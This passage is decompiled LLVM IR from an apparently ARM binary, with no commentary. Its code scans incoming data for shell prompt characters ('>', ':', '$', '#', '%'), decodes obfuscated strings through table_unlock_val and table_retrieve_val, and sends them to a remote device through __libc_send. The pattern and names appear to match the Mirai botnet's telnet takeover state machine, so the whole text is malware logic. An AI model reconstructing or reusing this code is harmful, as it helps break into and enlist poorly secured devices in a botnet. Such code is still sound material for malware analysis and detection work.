  store i32 %v2_fb48, i32* %r3.global-to-local, align 4
  %v1_fb4c = add i32 %v2_fb48, 28
  %v2_fb4c = inttoptr i32 %v1_fb4c to i8*
  %v3_fb4c = load i8, i8* %v2_fb4c, align 1
  %v4_fb4c = zext i8 %v3_fb4c to i32
  store i32 %v4_fb4c, i32* %r3.global-to-local, align 4
  %v2_fb50 = icmp ugt i8 %v3_fb4c, 61
  store i1 %v2_fb50, i1* %cpsr_c.global-to-local, align 1
  %v7_fb50 = icmp eq i8 %v3_fb4c, 62
  store i1 %v7_fb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb50, label %dec_label_pc_fbb4, label %bb441

bb441:                                            ; preds = %dec_label_pc_fb48
  %v3_fb54 = icmp ugt i8 %v3_fb4c, 57
  store i1 %v3_fb54, i1* %cpsr_c.global-to-local, align 1
  %v8_fb54 = icmp eq i8 %v3_fb4c, 58
  store i1 %v8_fb54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb54, label %dec_label_pc_fbb4, label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %bb441
  %v2_fb5c = icmp ugt i8 %v3_fb4c, 35
  store i1 %v2_fb5c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb5c = icmp eq i8 %v3_fb4c, 36
  store i1 %v7_fb5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb5c, label %dec_label_pc_fbb4, label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb5c
  %v2_fb64 = icmp ugt i8 %v3_fb4c, 34
  store i1 %v2_fb64, i1* %cpsr_c.global-to-local, align 1
  %v7_fb64 = icmp eq i8 %v3_fb4c, 35
  store i1 %v7_fb64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb64, label %dec_label_pc_fbb4, label %dec_label_pc_fb6c

dec_label_pc_fb6c:                                ; preds = %dec_label_pc_fb64
  %v2_fb6c = icmp ugt i8 %v3_fb4c, 36
  store i1 %v2_fb6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb6c = icmp eq i8 %v3_fb4c, 37
  store i1 %v7_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb6c, label %dec_label_pc_fbb4, label %dec_label_pc_fb9c.preheader

dec_label_pc_fb9c.preheader:                      ; preds = %dec_label_pc_fb6c
  %v3_fb70 = add i32 %v0_f79c, 28
  %v2_fb74 = add i32 %v3_fb70, %v3_fb38
  store i32 %v2_fb74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb9c

dec_label_pc_fb80:                                ; preds = %bb442
  %v2_fb80 = icmp ugt i8 %v3_fba4, 35
  store i1 %v2_fb80, i1* %cpsr_c.global-to-local, align 1
  %v7_fb80 = icmp eq i8 %v3_fba4, 36
  store i1 %v7_fb80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb80, label %dec_label_pc_fbb4, label %dec_label_pc_fb88

dec_label_pc_fb88:                                ; preds = %dec_label_pc_fb80
  %v2_fb88 = icmp ugt i8 %v3_fba4, 34
  store i1 %v2_fb88, i1* %cpsr_c.global-to-local, align 1
  %v7_fb88 = icmp eq i8 %v3_fba4, 35
  store i1 %v7_fb88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb88, label %dec_label_pc_fbb4, label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %dec_label_pc_fb88
  %v2_fb90 = icmp ugt i8 %v3_fba4, 36
  store i1 %v2_fb90, i1* %cpsr_c.global-to-local, align 1
  %v7_fb90 = icmp eq i8 %v3_fba4, 37
  store i1 %v7_fb90, i1* %cpsr_z.global-to-local, align 1
  %v1_fb94 = add i32 %v0_fb94, -1
  store i32 %v1_fb94, i32* %r3.global-to-local, align 4
  br i1 %v7_fb90, label %dec_label_pc_fbb4, label %dec_label_pc_fb9c

dec_label_pc_fb9c:                                ; preds = %dec_label_pc_fb9c.preheader, %dec_label_pc_fb90
  %v0_fb94 = phi i32 [ %v2_fb74, %dec_label_pc_fb9c.preheader ], [ %v1_fb94, %dec_label_pc_fb90 ]
  %v0_fb9c = phi i32 [ %v1_fb3c, %dec_label_pc_fb9c.preheader ], [ %v1_fb9c, %dec_label_pc_fb90 ]
  %v1_fb9c = add i32 %v0_fb9c, -1
  store i32 %v1_fb9c, i32* %r1.global-to-local, align 4
  %v2_fb9c = icmp ne i32 %v0_fb9c, 0
  store i1 %v2_fb9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb9c = icmp eq i32 %v0_fb9c, 1
  store i1 %v7_fb9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb9c, label %dec_label_pc_f71c.backedge.thread565, label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fb9c
  %v1_fba4 = add i32 %v0_fb94, -2
  %v2_fba4 = inttoptr i32 %v1_fba4 to i8*
  %v3_fba4 = load i8, i8* %v2_fba4, align 1
  %v4_fba4 = zext i8 %v3_fba4 to i32
  store i32 %v4_fba4, i32* %r2.global-to-local, align 4
  %v2_fba8 = icmp ugt i8 %v3_fba4, 61
  store i1 %v2_fba8, i1* %cpsr_c.global-to-local, align 1
  %v7_fba8 = icmp eq i8 %v3_fba4, 62
  store i1 %v7_fba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fba8, label %dec_label_pc_fbb4, label %bb442

bb442:                                            ; preds = %dec_label_pc_fba4
  %v3_fbac = icmp ugt i8 %v3_fba4, 57
  store i1 %v3_fbac, i1* %cpsr_c.global-to-local, align 1
  %v8_fbac = icmp eq i8 %v3_fba4, 58
  store i1 %v8_fbac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fbac, label %dec_label_pc_fbb4, label %dec_label_pc_fb80

dec_label_pc_fbb4:                                ; preds = %dec_label_pc_fba4, %bb442, %dec_label_pc_fb90, %dec_label_pc_fb88, %dec_label_pc_fb80, %dec_label_pc_fb6c, %dec_label_pc_fb48, %dec_label_pc_fb64, %dec_label_pc_fb5c, %bb441
  %v0_fbb8 = phi i32 [ %v1_fb3c, %dec_label_pc_fb6c ], [ %v1_fb3c, %dec_label_pc_fb48 ], [ %v1_fb3c, %dec_label_pc_fb64 ], [ %v1_fb3c, %dec_label_pc_fb5c ], [ %v1_fb3c, %bb441 ], [ %v1_fb9c, %dec_label_pc_fb80 ], [ %v1_fb9c, %dec_label_pc_fb88 ], [ %v1_fb9c, %dec_label_pc_fb90 ], [ %v1_fb9c, %bb442 ], [ %v1_fb9c, %dec_label_pc_fba4 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_fbb8 = add i32 %v0_fbb8, 1
  store i32 %v1_fbb8, i32* @r7, align 4
  %v1_fbbc = call i32 @table_unlock_val(i32 8)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_fbcc = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_fbcc, i32* %r0.global-to-local, align 4
  %v3_fbd0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fbd0, i32* %r2.global-to-local, align 4
  store i32 %v3_fbcc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fbdc = load i32, i32* @r6, align 4
  %v1_fbdc = add i32 %v0_fbdc, 4
  %v2_fbdc = inttoptr i32 %v1_fbdc to i32*
  %v3_fbdc = load i32, i32* %v2_fbdc, align 4
  store i32 %v3_fbdc, i32* %r0.global-to-local, align 4
  %v4_fbe0 = call i32 @__libc_send(i32 %v3_fbdc, i32 %v3_fbcc, i32 %v3_fbd0, i32 16384)
  store i32 %v4_fbe0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fbf0 = load i32, i32* @r6, align 4
  %v1_fbf0 = add i32 %v0_fbf0, 4
  %v2_fbf0 = inttoptr i32 %v1_fbf0 to i32*
  %v3_fbf0 = load i32, i32* %v2_fbf0, align 4
  store i32 %v3_fbf0, i32* %r0.global-to-local, align 4
  %v4_fbf4 = call i32 @__libc_send(i32 %v3_fbf0, i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_fbfc = call i32 @table_lock_val(i32 8)
  store i32 %v1_fbfc, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_fc04 = load i32, i32* @r6, align 4
  %v2_fc04 = add i32 %v1_fc04, 12
  %v3_fc04 = inttoptr i32 %v2_fc04 to i32*
  store i32 7, i32* %v3_fc04, align 4
  br label %dec_label_pc_f96c

dec_label_pc_fc0c:                                ; preds = %dec_label_pc_f79c
  %v1_fc0c = add i32 %v0_f79c, 24
  %v2_fc0c = inttoptr i32 %v1_fc0c to i32*
  %v3_fc0c = load i32, i32* %v2_fc0c, align 4
  store i32 %v3_fc0c, i32* %r2.global-to-local, align 4
  %v1_fc10 = add i32 %v3_fc0c, -1
  store i32 %v1_fc10, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc14 = icmp eq i32 %v1_fc10, 0
  store i1 %v2_fc14, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_fc10, 1
  br i1 %tmp443, label %dec_label_pc_f71c.backedge.thread, label %dec_label_pc_fc1c

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc0c
  %v2_fc1c = add i32 %v1_fc10, %v0_f79c
  store i32 %v2_fc1c, i32* %r3.global-to-local, align 4
  %v1_fc20 = add i32 %v2_fc1c, 28
  %v2_fc20 = inttoptr i32 %v1_fc20 to i8*
  %v3_fc20 = load i8, i8* %v2_fc20, align 1
  %v4_fc20 = zext i8 %v3_fc20 to i32
  store i32 %v4_fc20, i32* %r3.global-to-local, align 4
  %v2_fc24 = icmp ugt i8 %v3_fc20, 61
  store i1 %v2_fc24, i1* %cpsr_c.global-to-local, align 1
  %v7_fc24 = icmp eq i8 %v3_fc20, 62
  store i1 %v7_fc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc24, label %dec_label_pc_fc88, label %bb444

bb444:                                            ; preds = %dec_label_pc_fc1c
  %v3_fc28 = icmp ugt i8 %v3_fc20, 57
  store i1 %v3_fc28, i1* %cpsr_c.global-to-local, align 1
  %v8_fc28 = icmp eq i8 %v3_fc20, 58
  store i1 %v8_fc28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc28, label %dec_label_pc_fc88, label %dec_label_pc_fc30

dec_label_pc_fc30:                                ; preds = %bb444
  %v2_fc30 = icmp ugt i8 %v3_fc20, 35
  store i1 %v2_fc30, i1* %cpsr_c.global-to-local, align 1
  %v7_fc30 = icmp eq i8 %v3_fc20, 36
  store i1 %v7_fc30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc30, label %dec_label_pc_fc88, label %dec_label_pc_fc38

dec_label_pc_fc38:                                ; preds = %dec_label_pc_fc30
  %v2_fc38 = icmp ugt i8 %v3_fc20, 34
  store i1 %v2_fc38, i1* %cpsr_c.global-to-local, align 1
  %v7_fc38 = icmp eq i8 %v3_fc20, 35
  store i1 %v7_fc38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc38, label %dec_label_pc_fc88, label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fc38
  %v2_fc40 = icmp ugt i8 %v3_fc20, 36
  store i1 %v2_fc40, i1* %cpsr_c.global-to-local, align 1
  %v7_fc40 = icmp eq i8 %v3_fc20, 37
  store i1 %v7_fc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc40, label %dec_label_pc_fc88, label %dec_label_pc_fc70.preheader

dec_label_pc_fc70.preheader:                      ; preds = %dec_label_pc_fc40
  %v3_fc44 = add i32 %v0_f79c, 28
  %v2_fc48 = add i32 %v3_fc44, %v3_fc0c
  store i32 %v2_fc48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc70

dec_label_pc_fc54:                                ; preds = %bb445
  %v2_fc54 = icmp ugt i8 %v3_fc78, 35
  store i1 %v2_fc54, i1* %cpsr_c.global-to-local, align 1
  %v7_fc54 = icmp eq i8 %v3_fc78, 36
  store i1 %v7_fc54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc54, label %dec_label_pc_fc88, label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc54
  %v2_fc5c = icmp ugt i8 %v3_fc78, 34
  store i1 %v2_fc5c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc5c = icmp eq i8 %v3_fc78, 35
  store i1 %v7_fc5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc5c, label %dec_label_pc_fc88, label %dec_label_pc_fc64

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc5c
  %v2_fc64 = icmp ugt i8 %v3_fc78, 36
  store i1 %v2_fc64, i1* %cpsr_c.global-to-local, align 1
  %v7_fc64 = icmp eq i8 %v3_fc78, 37
  store i1 %v7_fc64, i1* %cpsr_z.global-to-local, align 1
  %v1_fc68 = add i32 %v0_fc68, -1
  store i32 %v1_fc68, i32* %r3.global-to-local, align 4
  br i1 %v7_fc64, label %dec_label_pc_fc88, label %dec_label_pc_fc70

dec_label_pc_fc70:                                ; preds = %dec_label_pc_fc70.preheader, %dec_label_pc_fc64
  %v0_fc68 = phi i32 [ %v2_fc48, %dec_label_pc_fc70.preheader ], [ %v1_fc68, %dec_label_pc_fc64 ]
  %v0_fc70 = phi i32 [ %v1_fc10, %dec_label_pc_fc70.preheader ], [ %v1_fc70, %dec_label_pc_fc64 ]
  %v1_fc70 = add i32 %v0_fc70, -1
  store i32 %v1_fc70, i32* %r1.global-to-local, align 4
  %v2_fc70 = icmp ne i32 %v0_fc70, 0
  store i1 %v2_fc70, i1* %cpsr_c.global-to-local, align 1
  %v7_fc70 = icmp eq i32 %v0_fc70, 1
  store i1 %v7_fc70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc70, label %dec_label_pc_f71c.backedge.thread565, label %dec_label_pc_fc78

dec_label_pc_fc78:                                ; preds = %dec_label_pc_fc70
  %v1_fc78 = add i32 %v0_fc68, -2
  %v2_fc78 = inttoptr i32 %v1_fc78 to i8*
  %v3_fc78 = load i8, i8* %v2_fc78, align 1
  %v4_fc78 = zext i8 %v3_fc78 to i32
  store i32 %v4_fc78, i32* %r2.global-to-local, align 4
  %v2_fc7c = icmp ugt i8 %v3_fc78, 61
  store i1 %v2_fc7c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc7c = icmp eq i8 %v3_fc78, 62
  store i1 %v7_fc7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc7c, label %dec_label_pc_fc88, label %bb445

bb445:                                            ; preds = %dec_label_pc_fc78
  %v3_fc80 = icmp ugt i8 %v3_fc78, 57
  store i1 %v3_fc80, i1* %cpsr_c.global-to-local, align 1
  %v8_fc80 = icmp eq i8 %v3_fc78, 58
  store i1 %v8_fc80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc80, label %dec_label_pc_fc88, label %dec_label_pc_fc54

dec_label_pc_fc88:                                ; preds = %dec_label_pc_fc78, %bb445, %dec_label_pc_fc64, %dec_label_pc_fc5c, %dec_label_pc_fc54, %dec_label_pc_fc40, %dec_label_pc_fc1c, %dec_label_pc_fc38, %dec_label_pc_fc30, %bb444
  %v0_fc8c = phi i32 [ %v1_fc10, %dec_label_pc_fc40 ], [ %v1_fc10, %dec_label_pc_fc1c ], [ %v1_fc10, %dec_label_pc_fc38 ], [ %v1_fc10, %dec_label_pc_fc30 ], [ %v1_fc10, %bb444 ], [ %v1_fc70, %dec_label_pc_fc54 ], [ %v1_fc70, %dec_label_pc_fc5c ], [ %v1_fc70, %dec_label_pc_fc64 ], [ %v1_fc70, %bb445 ], [ %v1_fc70, %dec_label_pc_fc78 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_fc8c = add i32 %v0_fc8c, 1
  store i32 %v1_fc8c, i32* @r7, align 4
  %v1_fc90 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_fca0 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_fca0, i32* %r0.global-to-local, align 4
  %v3_fca4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fca4, i32* %r2.global-to-local, align 4
  store i32 %v3_fca0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fcb0 = load i32, i32* @r6, align 4
  %v1_fcb0 = add i32 %v0_fcb0, 4
  %v2_fcb0 = inttoptr i32 %v1_fcb0 to i32*
  %v3_fcb0 = load i32, i32* %v2_fcb0, align 4
  store i32 %v3_fcb0, i32* %r0.global-to-local, align 4
  %v4_fcb4 = call i32 @__libc_send(i32 %v3_fcb0, i32 %v3_fca0, i32 %v3_fca4, i32 16384)
  store i32 %v4_fcb4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fcc4 = load i32, i32* @r6, align 4
  %v1_fcc4 = add i32 %v0_fcc4, 4
  %v2_fcc4 = inttoptr i32 %v1_fcc4 to i32*
  %v3_fcc4 = load i32, i32* %v2_fcc4, align 4
  store i32 %v3_fcc4, i32* %r0.global-to-local, align 4
  %v4_fcc8 = call i32 @__libc_send(i32 %v3_fcc4, i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_fcd0 = call i32 @table_lock_val(i32 7)
  store i32 %v1_fcd0, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_fcd8 = load i32, i32* @r6, align 4
  %v2_fcd8 = add i32 %v1_fcd8, 12
  %v3_fcd8 = inttoptr i32 %v2_fcd8 to i32*
  store i32 6, i32* %v3_fcd8, align 4
  br label %dec_label_pc_f96c

dec_label_pc_fce0:                                ; preds = %dec_label_pc_f79c
  %v1_fce0 = add i32 %v0_f79c, 24
  %v2_fce0 = inttoptr i32 %v1_fce0 to i32*
  %v3_fce0 = load i32, i32* %v2_fce0, align 4
  store i32 %v3_fce0, i32* %r2.global-to-local, align 4
  %v1_fce4 = add i32 %v3_fce0, -1
  store i32 %v1_fce4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fce8 = icmp eq i32 %v1_fce4, 0
  store i1 %v2_fce8, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_fce4, 1
  br i1 %tmp446, label %dec_label_pc_f71c.backedge.thread, label %dec_label_pc_fcf0

dec_label_pc_fcf0:                                ; preds = %dec_label_pc_fce0
  %v2_fcf0 = add i32 %v1_fce4, %v0_f79c
  store i32 %v2_fcf0, i32* %r3.global-to-local, align 4
  %v1_fcf4 = add i32 %v2_fcf0, 28
  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i8*
  %v3_fcf4 = load i8, i8* %v2_fcf4, align 1
  %v4_fcf4 = zext i8 %v3_fcf4 to i32
  store i32 %v4_fcf4, i32* %r3.global-to-local, align 4
  %v2_fcf8 = icmp ugt i8 %v3_fcf4, 61
  store i1 %v2_fcf8, i1* %cpsr_c.global-to-local, align 1
  %v7_fcf8 = icmp eq i8 %v3_fcf4, 62
  store i1 %v7_fcf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcf8, label %dec_label_pc_fdd0, label %bb447

bb447:                                            ; preds = %dec_label_pc_fcf0
  %v3_fcfc = icmp ugt i8 %v3_fcf4, 57
  store i1 %v3_fcfc, i1* %cpsr_c.global-to-local, align 1
  %v8_fcfc = icmp eq i8 %v3_fcf4, 58
  store i1 %v8_fcfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fcfc, label %dec_label_pc_fdd0, label %dec_label_pc_fd04

dec_label_pc_fd04:                                ; preds = %bb447
  %v2_fd04 = icmp ugt i8 %v3_fcf4, 35
  store i1 %v2_fd04, i1* %cpsr_c.global-to-local, align 1
  %v7_fd04 = icmp eq i8 %v3_fcf4, 36
  store i1 %v7_fd04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd04, label %dec_label_pc_fdd0, label %dec_label_pc_fd0c

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fd04
  %v2_fd0c = icmp ugt i8 %v3_fcf4, 34
  store i1 %v2_fd0c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd0c = icmp eq i8 %v3_fcf4, 35
  store i1 %v7_fd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd0c, label %dec_label_pc_fdd0, label %dec_label_pc_fd14

dec_label_pc_fd14:                                ; preds = %dec_label_pc_fd0c
  %v2_fd14 = icmp ugt i8 %v3_fcf4, 36
  store i1 %v2_fd14, i1* %cpsr_c.global-to-local, align 1
  %v7_fd14 = icmp eq i8 %v3_fcf4, 37
  store i1 %v7_fd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd14, label %dec_label_pc_fdd0, label %dec_label_pc_fdb8.preheader

dec_label_pc_fdb8.preheader:                      ; preds = %dec_label_pc_fd14
  %v3_fd18 = add i32 %v0_f79c, 28
  %v2_fd1c = add i32 %v3_fd18, %v3_fce0
  store i32 %v2_fd1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fd9c:                                ; preds = %bb448
  %v2_fd9c = icmp ugt i8 %v3_fdc0, 35
  store i1 %v2_fd9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd9c = icmp eq i8 %v3_fdc0, 36
  store i1 %v7_fd9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd9c, label %dec_label_pc_fdd0, label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd9c
  %v2_fda4 = icmp ugt i8 %v3_fdc0, 34
  store i1 %v2_fda4, i1* %cpsr_c.global-to-local, align 1
  %v7_fda4 = icmp eq i8 %v3_fdc0, 35
  store i1 %v7_fda4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fda4, label %dec_label_pc_fdd0, label %dec_label_pc_fdac

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fda4
  %v2_fdac = icmp ugt i8 %v3_fdc0, 36
  store i1 %v2_fdac, i1* %cpsr_c.global-to-local, align 1
  %v7_fdac = icmp eq i8 %v3_fdc0, 37
  store i1 %v7_fdac, i1* %cpsr_z.global-to-local, align 1
  %v1_fdb0 = add i32 %v0_fdb0, -1
  store i32 %v1_fdb0, i32* %r3.global-to-local, align 4
  br i1 %v7_fdac, label %dec_label_pc_fdd0, label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fdb8.preheader, %dec_label_pc_fdac
  %v0_fdb0 = phi i32 [ %v2_fd1c, %dec_label_pc_fdb8.preheader ], [ %v1_fdb0, %dec_label_pc_fdac ]
  %v0_fdb8 = phi i32 [ %v1_fce4, %dec_label_pc_fdb8.preheader ], [ %v1_fdb8, %dec_label_pc_fdac ]
  %v1_fdb8 = add i32 %v0_fdb8, -1
  store i32 %v1_fdb8, i32* %r1.global-to-local, align 4
  %v2_fdb8 = icmp ne i32 %v0_fdb8, 0
  store i1 %v2_fdb8, i1* %cpsr_c.global-to-local, align 1
  %v7_fdb8 = icmp eq i32 %v0_fdb8, 1
  store i1 %v7_fdb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdb8, label %dec_label_pc_f71c.backedge.thread565, label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fdb8
  %v1_fdc0 = add i32 %v0_fdb0, -2
  %v2_fdc0 = inttoptr i32 %v1_fdc0 to i8*
  %v3_fdc0 = load i8, i8* %v2_fdc0, align 1
  %v4_fdc0 = zext i8 %v3_fdc0 to i32
  store i32 %v4_fdc0, i32* %r2.global-to-local, align 4
  %v2_fdc4 = icmp ugt i8 %v3_fdc0, 61
  store i1 %v2_fdc4, i1* %cpsr_c.global-to-local, align 1
  %v7_fdc4 = icmp eq i8 %v3_fdc0, 62
  store i1 %v7_fdc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdc4, label %dec_label_pc_fdd0, label %bb448

bb448:                                            ; preds = %dec_label_pc_fdc0
  %v3_fdc8 = icmp ugt i8 %v3_fdc0, 57
  store i1 %v3_fdc8, i1* %cpsr_c.global-to-local, align 1
  %v8_fdc8 = icmp eq i8 %v3_fdc0, 58
  store i1 %v8_fdc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fdc8, label %dec_label_pc_fdd0, label %dec_label_pc_fd9c

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fdc0, %bb448, %dec_label_pc_fdac, %dec_label_pc_fda4, %dec_label_pc_fd9c, %dec_label_pc_fd14, %dec_label_pc_fcf0, %dec_label_pc_fd0c, %dec_label_pc_fd04, %bb447
  %v0_fdd4 = phi i32 [ %v1_fce4, %dec_label_pc_fd14 ], [ %v1_fce4, %dec_label_pc_fcf0 ], [ %v1_fce4, %dec_label_pc_fd0c ], [ %v1_fce4, %dec_label_pc_fd04 ], [ %v1_fce4, %bb447 ], [ %v1_fdb8, %dec_label_pc_fd9c ], [ %v1_fdb8, %dec_label_pc_fda4 ], [ %v1_fdb8, %dec_label_pc_fdac ], [ %v1_fdb8, %bb448 ], [ %v1_fdb8, %dec_label_pc_fdc0 ]
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_fdd4 = add i32 %v0_fdd4, 1
  store i32 %v1_fdd4, i32* @r7, align 4
  %v1_fdd8 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_fde8 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_fde8, i32* %r0.global-to-local, align 4
  %v3_fdec = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fdec, i32* %r2.global-to-local, align 4
  store i32 %v3_fde8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fdf8 = load i32, i32* @r6, align 4
  %v1_fdf8 = add i32 %v0_fdf8, 4
  %v2_fdf8 = inttoptr i32 %v1_fdf8 to i32*
  %v3_fdf8 = load i32, i32* %v2_fdf8, align 4
  store i32 %v3_fdf8, i32* %r0.global-to-local, align 4
  %v4_fdfc = call i32 @__libc_send(i32 %v3_fdf8, i32 %v3_fde8, i32 %v3_fdec, i32 16384)
  store i32 %v4_fdfc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fe0c = load i32, i32* @r6, align 4
  %v1_fe0c = add i32 %v0_fe0c, 4
  %v2_fe0c = inttoptr i32 %v1_fe0c to i32*
  %v3_fe0c = load i32, i32* %v2_fe0c, align 4
  store i32 %v3_fe0c, i32* %r0.global-to-local, align 4
  %v4_fe10 = call i32 @__libc_send(i32 %v3_fe0c, i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32 2, i32 16384)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_fe18 = call i32 @table_lock_val(i32 9)
  store i32 %v1_fe18, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_fe20 = load i32, i32* @r6, align 4
  %v2_fe20 = add i32 %v1_fe20, 12
  %v3_fe20 = inttoptr i32 %v2_fe20 to i32*
  store i32 9, i32* %v3_fe20, align 4
  br label %dec_label_pc_f96c

dec_label_pc_fe28:                                ; preds = %dec_label_pc_f79c
  %v1_fe28 = add i32 %v0_f79c, 24
  %v2_fe28 = inttoptr i32 %v1_fe28 to i32*
  %v3_fe28 = load i32, i32* %v2_fe28, align 4
  store i32 %v3_fe28, i32* %r2.global-to-local, align 4
  %v1_fe2c = add i32 %v3_fe28, -1
  store i32 %v1_fe2c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fe30 = icmp eq i32 %v1_fe2c, 0
  store i1 %v2_fe30, i1* %cpsr_z.global-to-local, align 1
  %tmp449 = icmp slt i32 %v1_fe2c, 1
  br i1 %tmp449, label %dec_label_pc_fe94, label %dec_label_pc_fe38

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe28
  %v2_fe38 = add i32 %v1_fe2c, %v0_f79c
  store i32 %v2_fe38, i32* %r3.global-to-local, align 4
  %v1_fe3c = add i32 %v2_fe38, 28
  %v2_fe3c = inttoptr i32 %v1_fe3c to i8*
  %v3_fe3c = load i8, i8* %v2_fe3c, align 1
  %v4_fe3c = zext i8 %v3_fe3c to i32
  store i32 %v4_fe3c, i32* %r3.global-to-local, align 4
  %v2_fe40 = icmp ugt i8 %v3_fe3c, 61
  store i1 %v2_fe40, i1* %cpsr_c.global-to-local, align 1
  %v7_fe40 = icmp eq i8 %v3_fe3c, 62
  store i1 %v7_fe40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe40, label %dec_label_pc_101c8, label %bb450

bb450:                                            ; preds = %dec_label_pc_fe38
  %v3_fe44 = icmp ugt i8 %v3_fe3c, 57
